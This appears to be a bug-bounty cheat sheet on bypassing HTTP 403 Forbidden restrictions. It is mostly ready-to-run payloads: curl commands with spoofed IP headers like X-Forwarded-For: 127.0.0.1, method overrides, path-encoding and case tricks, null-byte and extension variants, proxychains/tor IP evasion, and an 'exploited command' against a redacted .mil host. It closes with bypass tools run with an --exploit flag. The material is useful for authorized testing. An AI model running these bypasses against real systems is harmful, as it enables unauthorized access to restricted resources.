1.RECURSIVE FUZZING:
eg: /log =>403
    /log/oi.txt =>200ok 
    
  =>You can also do fuzzing to this endpoints like this:
    · /FUZZ/admin
    · /admin/FUZZ
    · /adminFUZZ
    
2.MODIFICATION ON REQUESTS:
 
       =>Adding special chars to endpoint:
        eg:
        a.com/info.php =>403
        a.com/info.php"=>200
        a.com/info.php* =>200
        a.com/info.php/* =>200
        a.com/info.php. =>200
     
	=>changing HTTP METHODS:
	get
	post
	put
	patch
	delete
	options
	etc..

	=>changing http protocol version
	1.0,1.1,0.9,2.0,2,2 ETC..

	=>Adding http headers:
	X-Original-URL: /admin
	X-Real-IP: 10.0.0.1
	X-Custom-IP-Authorization
	X-Forwarded-Host: localhost
	X-Originating-IP: 127.0.0.1
	X-Forwarded-For: 127.0.0.1
	X-Forwarded: 127.0.0.1
	Forwarded-For: 127.0.0.1
	X-Remote-IP: 127.0.0.1
	X-Remote-Addr: 127.0.0.1
	X-ProxyUser-Ip: 127.0.0.1
	X-Original-URL: 127.0.0.1
	Client-IP: 127.0.0.1
	True-Client-IP: 127.0.0.1
	Cluster-Client-IP: 127.0.0.1
	X-ProxyUser-Ip: 127.0.0.1
	Host: localhost
	X-Originating-IP,
	X-Forwarded-For,
	X-Forwarded,
	Forwarded-For,
	X-Remote-IP,
	X-Remote-Addr,
	X-ProxyUser-Ip,
	X-Original-URL,
	Client-IP,
	True-Client-IP,
	Cluster-Client-IP
 
	 With values such as:
		10.0.0.0 
		10.0.0.1
		127.0.0.1
		127.0.0.1:443
		127.0.0.1:80
		172.16.0.0
		localhost
				eg:
				header tricks:
				curl -X GET https://target.com/admin -H "X-Original-URL: /admin"
				curl -X GET https://target.com/ -H "X-Custom-IP-Authorization: 127.0.0.1"
				curl -X GET https://target.com/ -H "X-Forwarded-For: 127.0.0.1"
				curl -X GET https://target.com/ -H "X-Host: 127.0.0.1"
				curl -X GET https://target.com/ -H "X-Original-Host: 127.0.0.1"


	=>modifying path and host:
	GET /admin HTTP/1.1  
	Host: google.com

	=>Remove host header in request:
	GET /reach%2fsip.svc HTTP/1.0
	<deleted_host_header>


	=>Change http case get /admin HTTP/1.1

	=>Switch between http and https

	=>Change HTTP Method Using Header

	Use headers such as X-HTTP-Method-Override to bypass method restrictions. - For example, setting X-HTTP-Method-Override: PUT 
	in a POST request. - Other methods: - X-Original-Method - X-Method-Override


	=>Change api version v2 ->v1

	=>Bypass via Referer Header:
	Some sites block requests unless they originate from a valid referrer.
	Example:
	curl -H “Referrer: http://example.com/” http://example.com/secret/



	=>Customizing headers like User-Agent or Referer can bypass restrictions:
	Example:
	curl -A “Mozilla/5.0” http://example.com/secret/
	Real-world Scenario: Some websites block requests from automated tools like curl or Burp Suite. By 
	changing the User-Agent to mimic a browser, access may be granted.

6.Path Encode and tricks:

/admin -> /%61dmin
site.com/secret => 403
site.com/secret/ => 200
https://target.com/%2e/secret  # URL encoding
https://target.com/./secret    # Relative path trick

example.com/secrets.txt/
example.com/;/secrets.txt
example.com/\/\/\/secrets.txt
example.com/secrets.txt.txt
curl http://example.com/SeCrEt/
curl http://example.com//secret/
curl http://example.com/%2e/secret/
curl http://example.com/../secret/
 
site.com/secret/* => 200
site.com/secret/./ => 200
http://example.com/%2Fsecret/
# Using common bypass payloads
/common/
/%2e/
/%2e%2e/
/..;/admin
/admin/
/admin%20/
/admin%09/
/admin%2f/
/%2e%2e%2fadmin
/admin -> 403
/Admin -> 200
/AdMin -> 200
/admin/ -> 200
/admin/. -> 200
//admin// -> 200
/.;/admin -> 200
/./admin/.. -> 200
/admin.json -> 200
/;/admin -> 200
//;//admin -> 200
/admi%6e -> 200 [n is url encoded to %6e]
/%2e/admin -> 200
/admin..;/ -> 200


curl https://example.com/admin
curl https://example.com/Admin
curl https://example.com/ADMIN
curl https://example.com/aDmiN
curl https://example.com/adMin
curl https://example.com/AdMiN
curl https://example.com/aDMIN
curl https://example.com/ADMIn

null bypte:
curl --path-as-is "https://example.com/admin.php%00.html"
curl --path-as-is "https://example.com/config.php%00.json"
curl --path-as-is "https://example.com/login.php%00?redirect=admin"
curl --path-as-is "https://example.com/user/profile%00.php"
curl --path-as-is "https://example.com/images/logo%00.jpg"
curl --path-as-is "https://example.com/admin%00.php"
curl --path-as-is "https://example.com/secret%00file.txt"
curl --path-as-is "https://example.com/uploads/file%00.zip"

extensions:
curl https://example.com/admin.json
curl https://example.com/admin.css
curl https://example.com/admin.js
curl https://example.com/admin.html
curl https://example.com/admin.php
curl https://example.com/admin.aspx
curl https://example.com/admin.xml
curl https://example.com/admin.txt
curl https://example.com/admin.bak
curl https://example.com/admin.old
curl https://example.com/admin.zip
curl https://example.com/admin.tar.gz

Double extension bypasses
Some servers poorly validate extensions, e.g.:

    /admin.php → blocked
    /admin.php.bak → accessible
    /admin.php.txt → served as plain text (source leak)

4. Append Extra Characters
curl http://example.com/secret/
curl http://example.com/secret..;/
curl http://example.com/secret.



5. Leverage Proxy or IP Spoofing
403 errors due to IP restrictions can sometimes be bypassed using a proxy or VPN.
Example: ( can use proxychains+tor)
proxychains curl http://example.com/secret/
proxychains curl -X POST https://target.com/api/users -d '{"role":"admin"}'
Scenario: A company blocks foreign IPs, but using a VPN located in an allowed country grants access.




Exploited command: curl -H "Content-Length:0" -X POST https://www.███████.mil/██████████ 
Denied command: curl -X GET https://www.███████.mil/██████


------------------------------Tools---------------------------------------:
1.403bypass.sh
./bypass-403.sh https://example.com admin
./bypass-403.sh website-here path-here

2.burp 403 bypasser

3.nuclei:
cat paths.txt | nuclei -t /prsnl/403-bypass.yaml -rl 10 -c 3 -silent -o 403-bypass-results.txt

4.403-bypass2.sh
root@me_dheeraj:$ bash 403-bypass2.sh -u https://target.com/secret --exploit

